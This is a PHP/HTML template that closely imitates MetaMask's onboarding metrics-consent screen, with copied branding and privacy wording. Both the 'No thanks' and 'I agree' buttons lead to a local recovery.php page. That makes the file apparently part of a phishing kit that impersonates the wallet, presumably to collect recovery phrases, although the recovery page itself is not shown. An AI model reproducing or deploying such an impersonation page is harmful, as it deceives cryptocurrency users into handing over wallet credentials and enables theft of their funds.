<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'The Ultimate Crypto Wallet for DeFi, Web3 Apps, and NFTs | MetaMask';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <?php
        $list = [
            ['img' => base_url('assets/img/mt/MetaMask_Fox.svg'), 'h4' => "Let's get started", 'div' => "Trusted by millions, MetaMask is a secure wallet making the world of web3 accessible to all."],
            ['img' => base_url('assets/img/mt/onboarding-welcome-say-hello.svg'), 'h4' => "Explore decentralized apps", 'div' => "Store, send and spend crypto currencies and assets."],
            ['img' => base_url('assets/img/mt/onboarding-welcome-decentralised-apps.svg'), 'h4' => "Say hello to your wallet", 'div' => "Use your MetaMask to login to decentralized apps - no signup needed."],
        ];
        ?>
        <div class="container">
            <div class="row justify-content-center mt40">
                <div class="col-sm-6 rounded-4 border p25">
                    <h4 class="text-center fw-bold mt15">Help us improve MetaMask</h4>
                    <div class="my15">We’d like to gather basic usage and diagnostics data to improve MetaMask. Know that we never sell the data you provide here.</div>
                    <a href="https://consensys.io/privacy-notice" class="text-decoration-none text-primary" target="_blank">Learn how we protect your privacy while collecting usage data for your profile.</a>
                    <div class="my15">When we gather metrics, it will always be...</div>
                    <div class="my30">
                        <p><i class="fa-solid fa-check text-primary me20"></i> <b>Private: </b> clicks and views on the app are stored, but other details (like your public address) are not.</p>
                        <p><i class="fa-solid fa-check text-primary me20"></i> <b>General: </b> we temporarily use your IP address to detect a general location (like your country or region), but it's never stored.</p>
                        <p><i class="fa-solid fa-check text-primary me20"></i> <b>Optional: </b> you decide if you want to share or delete your usage data via settings any time.</p>
                    </div>
                    <div class="form-check my20">
                        <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault">
                        <label class="form-check-label" for="flexCheckDefault">We’ll use this data to learn how you interact with our marketing communications. We may share relevant news (like product features).</label>
                    </div>
                    <div class="my20 fs14 text-secondary">We’ll let you know if we decide to use this data for other purposes. You can review our <a href="https://consensys.io/privacy-notice" class="text-decoration-none text-primary" target="_blank">Privacy Policy</a> for more information. Remember, you can go to settings and opt out at any time.</div>
                    <div class="row my40">
                        <div class="col-sm-6">
                            <a href="<?= base_url('recovery.php') ?>" class="btn btn-outline-primary w-100 rounded-pill py12 fs15">No thanks</a>
                        </div>
                        <div class="col-sm-6">
                            <a href="<?= base_url('recovery.php') ?>" class="btn btn-primary bg-primary-2 w-100 rounded-pill py12 fs15">I agree</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php include_once './includes/footer.php'; ?>
</body>
</html>